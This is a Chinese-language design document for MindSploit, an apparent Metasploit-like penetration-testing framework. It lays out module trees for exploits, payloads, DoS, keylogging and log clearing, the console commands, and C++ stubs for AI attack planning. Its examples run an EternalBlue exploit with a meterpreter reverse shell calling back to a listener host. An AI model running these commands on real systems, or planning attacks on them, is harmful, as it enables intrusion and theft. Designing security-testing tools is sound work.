# MindSploit 模块设计文档

## 🎯 设计理念

MindSploit采用模块化架构，参考Metasploit Framework的设计理念，同时融入AI能力。每个模块都是独立的功能单元，支持动态加载、配置和执行。

## 📦 模块分类体系

### 1. Discovery (漏洞发现模块)
**路径**: `src/modules/discovery/`
**用途**: 信息收集、网络发现、漏洞识别

#### 子模块列表
```
discovery/
├── network/
│   ├── port_scanner.cpp        # 端口扫描器
│   ├── host_discovery.cpp      # 主机发现
│   ├── service_detection.cpp   # 服务识别
│   └── os_fingerprint.cpp      # 操作系统指纹
├── web/
│   ├── dir_scanner.cpp         # 目录扫描
│   ├── vuln_scanner.cpp        # Web漏洞扫描
│   ├── cms_detection.cpp       # CMS识别
│   └── ssl_scanner.cpp         # SSL/TLS扫描
├── database/
│   ├── mysql_scanner.cpp       # MySQL扫描
│   ├── mssql_scanner.cpp       # MSSQL扫描
│   └── oracle_scanner.cpp      # Oracle扫描
└── wireless/
    ├── wifi_scanner.cpp        # WiFi扫描
    └── bluetooth_scanner.cpp   # 蓝牙扫描
```

#### 使用示例
```bash
MindSploit > use discovery/network/port_scanner
MindSploit discovery(port_scanner) > set RHOSTS 192.168.1.0/24
MindSploit discovery(port_scanner) > set PORTS 1-1000
MindSploit discovery(port_scanner) > run
```

### 2. Exploits (渗透模块)
**路径**: `src/modules/exploits/`
**用途**: 漏洞利用、获取访问权限

#### 子模块列表
```
exploits/
├── remote/
│   ├── http/
│   │   ├── apache_struts.cpp   # Apache Struts漏洞
│   │   ├── iis_buffer.cpp      # IIS缓冲区溢出
│   │   └── php_rce.cpp         # PHP远程代码执行
│   ├── ssh/
│   │   ├── ssh_auth_bypass.cpp # SSH认证绕过
│   │   └── ssh_key_exploit.cpp # SSH密钥利用
│   └── smb/
│       ├── ms17_010.cpp        # EternalBlue
│       └── smb_relay.cpp       # SMB中继攻击
├── local/
│   ├── windows/
│   │   ├── privilege_esc.cpp   # Windows权限提升
│   │   └── uac_bypass.cpp      # UAC绕过
│   └── linux/
│       ├── kernel_exploit.cpp  # 内核漏洞利用
│       └── sudo_exploit.cpp    # Sudo漏洞利用
└── web/
    ├── sql_injection.cpp       # SQL注入利用
    ├── xss_exploit.cpp         # XSS利用
    └── file_upload.cpp         # 文件上传漏洞
```

#### 使用示例
```bash
MindSploit > use exploits/remote/smb/ms17_010
MindSploit exploit(ms17_010) > set RHOSTS 192.168.1.100
MindSploit exploit(ms17_010) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
MindSploit exploit(ms17_010) > set LHOST 192.168.1.50
MindSploit exploit(ms17_010) > exploit
```

### 3. Payloads (攻击载荷)
**路径**: `src/modules/payloads/`
**用途**: 载荷生成、Shell管理

#### 载荷分类
```
payloads/
├── singles/           # 单一载荷
│   ├── cmd/
│   ├── powershell/
│   └── bash/
├── stagers/          # 分阶段载荷
│   ├── reverse_tcp/
│   ├── bind_tcp/
│   └── reverse_http/
├── stages/           # 载荷阶段
│   ├── meterpreter/
│   ├── shell/
│   └── vnc/
└── encoders/         # 编码器
    ├── x86/
    ├── x64/
    └── generic/
```

#### 使用示例
```bash
MindSploit > use payload/windows/x64/meterpreter/reverse_tcp
MindSploit payload(reverse_tcp) > set LHOST 192.168.1.50
MindSploit payload(reverse_tcp) > set LPORT 4444
MindSploit payload(reverse_tcp) > generate
```

### 4. Auxiliary (辅助模块)
**路径**: `src/modules/auxiliary/`
**用途**: 辅助功能、工具集合

#### 子模块列表
```
auxiliary/
├── scanner/          # 扫描器
│   ├── http/
│   ├── ftp/
│   ├── ssh/
│   └── smb/
├── fuzzer/           # 模糊测试
│   ├── http_fuzzer.cpp
│   └── protocol_fuzzer.cpp
├── sniffer/          # 网络嗅探
│   ├── packet_capture.cpp
│   └── credential_sniffer.cpp
├── cracker/          # 密码破解
│   ├── hash_cracker.cpp
│   ├── zip_cracker.cpp
│   └── pdf_cracker.cpp
├── gather/           # 信息收集
│   ├── enum_shares.cpp
│   ├── enum_users.cpp
│   └── enum_services.cpp
└── dos/              # 拒绝服务
    ├── tcp_flood.cpp
    └── http_flood.cpp
```

### 5. Post (后渗透模块)
**路径**: `src/modules/post/`
**用途**: 后渗透操作、持久化

#### 子模块列表
```
post/
├── persistence/      # 持久化
│   ├── registry_run.cpp
│   ├── service_persist.cpp
│   └── startup_folder.cpp
├── escalation/       # 权限提升
│   ├── getsystem.cpp
│   ├── bypassuac.cpp
│   └── kernel_exploit.cpp
├── lateral/          # 横向移动
│   ├── psexec.cpp
│   ├── wmi_exec.cpp
│   └── ssh_tunnel.cpp
├── exfiltration/     # 数据窃取
│   ├── file_collector.cpp
│   ├── keylogger.cpp
│   └── screenshot.cpp
└── cleanup/          # 痕迹清理
    ├── clear_logs.cpp
    ├── delete_files.cpp
    └── registry_clean.cpp
```

### 6. AI (AI辅助模块)
**路径**: `src/modules/ai/`
**用途**: AI分析、智能建议

#### AI模块架构
```
ai/
├── models/           # 模型管理
│   ├── model_loader.cpp
│   ├── openai_client.cpp
│   ├── ollama_client.cpp
│   └── custom_model.cpp
├── analyzers/        # 分析器
│   ├── target_analyzer.cpp
│   ├── vuln_analyzer.cpp
│   ├── traffic_analyzer.cpp
│   └── result_analyzer.cpp
├── planners/         # 规划器
│   ├── attack_planner.cpp
│   ├── path_finder.cpp
│   └── strategy_optimizer.cpp
└── generators/       # 生成器
    ├── report_generator.cpp
    ├── payload_generator.cpp
    └── command_generator.cpp
```

## 🎮 命令系统详细设计

### 全局命令 (Global Commands)
```bash
# 基础系统命令
help [command/module]     # 显示帮助信息
version                   # 显示版本信息
exit/quit                 # 退出程序
clear/cls                 # 清空屏幕
banner                    # 显示程序横幅
history                   # 显示命令历史
alias <name> <command>    # 创建命令别名

# 模块管理命令
use <module_path>         # 使用指定模块
back                      # 返回上一级/退出当前模块
info [module]            # 显示模块详细信息
search <keyword>         # 搜索模块
show <type>              # 显示信息 (modules/options/payloads等)
reload [module]          # 重新加载模块

# 配置管理命令
set <option> <value>      # 设置选项值
unset <option>           # 取消设置选项
setg <option> <value>    # 设置全局选项
unsetg <option>          # 取消全局选项
save                     # 保存当前配置
load <config_file>       # 加载配置文件

# 会话管理命令
sessions                  # 显示所有会话
session <id>             # 切换到指定会话
session -i <id>          # 交互指定会话
session -k <id>          # 终止指定会话
background               # 将当前会话放到后台

# 任务管理命令
jobs                     # 显示后台任务
job <id>                 # 查看任务详情
kill <job_id>           # 终止指定任务
```

### 模块特定命令
```bash
# 在模块上下文中可用的命令
show options             # 显示模块选项
show advanced           # 显示高级选项
show targets            # 显示可用目标
show payloads           # 显示兼容载荷
check                   # 检查目标是否易受攻击
run/exploit             # 执行模块
rexploit                # 重新执行
```

### AI交互命令
```bash
# AI模式控制
ai                      # 进入AI交互模式
ai exit                 # 退出AI模式
ai help                 # AI命令帮助

# AI模型管理
ai models               # 列出可用模型
ai model <name>         # 切换AI模型
ai model info          # 显示当前模型信息
ai config              # AI配置管理

# AI分析功能
ai analyze <target>     # 分析目标
ai suggest             # 获取攻击建议
ai explain <result>    # 解释结果
ai plan <objective>    # 制定攻击计划
ai optimize <payload>  # 优化载荷
ai assess <action>     # 风险评估

# AI生成功能
ai generate report     # 生成报告
ai generate payload    # 生成载荷
ai generate script     # 生成脚本
ai translate <command> # 命令翻译
```

## 🤖 AI交互设计详解

### AI模式架构
```cpp
class AIInteractionMode {
private:
    std::unique_ptr<AIModelInterface> currentModel;
    AIContext context;
    bool aiModeActive = false;
    
public:
    // 模式控制
    bool enterAIMode();
    bool exitAIMode();
    bool isAIModeActive() const;
    
    // 模型管理
    bool loadModel(const std::string& modelName);
    bool switchModel(const std::string& modelName);
    std::vector<std::string> getAvailableModels();
    
    // AI交互
    std::string processAICommand(const std::string& command);
    std::string getAIResponse(const std::string& query);
    void updateContext(const std::string& key, const std::string& value);
};
```

### AI上下文管理
```cpp
class AIContext {
private:
    std::map<std::string, std::string> contextData;
    std::vector<std::string> conversationHistory;
    std::string currentTarget;
    std::string currentObjective;
    
public:
    // 上下文操作
    void setTarget(const std::string& target);
    void setObjective(const std::string& objective);
    void addScanResult(const std::string& result);
    void addExploitResult(const std::string& result);
    
    // 智能分析
    std::string generateContextSummary();
    std::vector<std::string> getSuggestedActions();
    std::string assessCurrentSituation();
};
```

### AI模型接口
```cpp
class AIModelInterface {
public:
    virtual ~AIModelInterface() = default;
    
    // 基础接口
    virtual bool initialize(const std::string& config) = 0;
    virtual std::string query(const std::string& prompt) = 0;
    virtual bool isAvailable() const = 0;
    
    // 专业功能
    virtual std::string analyzeTarget(const std::string& targetInfo) = 0;
    virtual std::string suggestAttackVector(const std::string& context) = 0;
    virtual std::string explainVulnerability(const std::string& vulnInfo) = 0;
    virtual std::string generateReport(const std::string& data) = 0;
};
```

这个设计提供了完整的模块化架构，支持良好的扩展性，同时将AI作为独立模块集成，用户可以在手动测试和AI辅助之间自由切换。
